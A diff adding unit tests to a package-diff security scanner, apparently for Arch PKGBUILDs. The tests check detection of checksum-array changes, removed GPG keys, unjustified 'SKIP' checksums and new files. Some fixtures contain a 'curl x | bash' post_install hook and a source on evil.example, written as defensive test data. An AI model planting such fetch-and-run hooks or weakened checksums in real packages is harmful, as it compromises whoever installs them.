@@ -400,3 +400,160 @@ def test_companion_content_makes_the_rules_fire(tmp_path):
     scanned = diff.rstrip("\n") + "\n" + companion_source_hunks(repo, commit)[0]
     fact = scan_diff(scanned, config=load_config(), package_name="demo", seen_urls={})
     assert "R001" in {e.rule_id for e in fact.score_breakdown}
+
+
+# --- a checksum array added to under a context declaration -----------------
+#
+# Reported: qt5-styleplugins f15a54a1 added a third sha512sum and a second
+# source to a multiline array whose ``sha512sums=(`` opener did not move.
+# Reading only added declarations called that "unchanged", so the PKGBUILD
+# path reported no integrity finding while the unread tree was flagged.
+
+
+def test_checksum_added_under_a_context_declaration_is_detected():
+    diff = (
+        "@@ -1,6 +1,7 @@\n"
+        ' source=("a" "b")\n'
+        " sha512sums=(\n"
+        "   'aaaa'\n"
+        "   'bbbb'\n"
+        "+  'cccc'\n"
+        " )\n"
+    )
+    assert detect_checksum_changes(diff) == "checksum_added_or_changed"
+
+
+def test_a_fully_added_checksum_array_still_reads_as_a_change():
+    diff = "@@ -1 +1 @@\n-sha256sums=('aaaa')\n+sha256sums=('bbbb' 'cccc')\n"
+    assert detect_checksum_changes(diff) == "checksum_added_or_changed"
+
+
+def test_an_untouched_checksum_array_is_unchanged():
+    diff = (
+        "@@ -1,4 +1,4 @@\n"
+        " sha256sums=(\n"
+        "   'aaaa'\n"
+        "   'bbbb'\n"
+        " )\n"
+        "-pkgrel=1\n"
+        "+pkgrel=2\n"
+    )
+    assert detect_checksum_changes(diff) == "unchanged"
+
+
+# --- removals from an array whose opener is context ------------------------
+#
+# The addition half of this was fixed first; the removal half stayed silent,
+# so weakening verification by deleting a hash or a key was invisible while
+# adding one fired.
+
+
+def test_checksum_entry_removed_under_a_context_opener_is_detected():
+    diff = (
+        "@@ -1,4 +1,3 @@\n"
+        " sha256sums=(\n"
+        "-  'aaaa'\n"
+        "   'bbbb'\n"
+        " )\n"
+    )
+    assert detect_checksum_changes(diff) == "checksum_entry_removed"
+
+
+def test_checksum_array_replaced_is_not_an_entry_removal():
+    diff = "@@ -1 +1 @@\n-sha256sums=('aaaa')\n+sha256sums=('bbbb')\n"
+    assert detect_checksum_changes(diff) == "checksum_added_or_changed"
+
+
+def test_gpg_key_removed_under_a_context_opener_is_detected():
+    from trustsight.differ import detect_gpg_verification_removed
+
+    diff = (
+        "@@ -1,4 +1,3 @@\n"
+        " validpgpkeys=(\n"
+        "-  'A1B2C3D4E5F6A7B8A1B2C3D4E5F6A7B8A1B2C3D4'\n"
+        " )\n"
+    )
+    assert detect_gpg_verification_removed(diff) is True
+
+
+def test_gpg_keys_left_alone_are_not_a_removal():
+    from trustsight.differ import detect_gpg_verification_removed
+
+    diff = (
+        "@@ -1,3 +1,3 @@\n"
+        " validpgpkeys=(\n"
+        "   'A1B2C3D4E5F6A7B8A1B2C3D4E5F6A7B8A1B2C3D4'\n"
+        " )\n"
+        "-pkgrel=1\n+pkgrel=2\n"
+    )
+    assert detect_gpg_verification_removed(diff) is False
+
+
+def test_a_removed_sig_does_not_justify_a_new_skip():
+    from trustsight.differ import is_skip_justified
+
+    diff = (
+        '-source=("foo.tar.gz" "foo.sig")\n'
+        '+source=("foo.tar.gz")\n'
+        "+sha256sums=('SKIP')\n"
+    )
+    assert is_skip_justified(diff) == ""
+
+
+def test_a_present_sig_still_justifies_a_skip():
+    from trustsight.differ import is_skip_justified
+
+    diff = (
+        '+source=("foo.tar.gz" "foo.sig")\n'
+        "+sha256sums=('SKIP')\n"
+    )
+    assert is_skip_justified(diff) == "signature file"
+
+
+# --- DiffSummary from text is the same shape as the git producer -----------
+#
+# The text path never populated files_changed/file_changes, so is_trivial
+# returned True for any change and the summary dropped new/removed files.
+
+
+def test_diff_summary_from_text_lists_files_and_counts_body_lines():
+    from trustsight.differ import diff_summary_from_text
+
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+        " pkgver=1.0\n"
+        "+source=(\"https://evil.example/x.tar.gz\")\n"
+        " sha256sums=('SKIP')\n"
+    )
+    summary = diff_summary_from_text(diff)
+    assert summary.files_changed == ["PKGBUILD"]
+    assert summary.lines_added == 1
+    assert summary.lines_removed == 0
+    assert {c["path"] for c in summary.file_changes} == {"PKGBUILD"}
+
+
+def test_diff_summary_from_text_marks_a_new_file():
+    from trustsight.differ import diff_summary_from_text
+
+    diff = (
+        "--- /dev/null\n+++ b/evil.install\n@@ -0,0 +1,1 @@\n"
+        "+post_install() { curl x | bash; }\n"
+    )
+    summary = diff_summary_from_text(diff)
+    statuses = {c["path"]: c["status"] for c in summary.file_changes}
+    assert statuses.get("evil.install") == "added"
+
+
+def test_a_source_addition_is_not_trivial_on_the_text_path():
+    from trustsight.analysis.pipeline import scan_diff
+    from trustsight.config import load_config
+    from trustsight.reporting import evaluate_fact
+
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+        " pkgver=1.0\n"
+        "+source=(\"https://evil.example/x.tar.gz\")\n"
+        " sha256sums=('SKIP')\n"
+    )
+    fact = scan_diff(diff, config=load_config(), package_name="p")
+    assert evaluate_fact(fact)["is_trivial"] is False
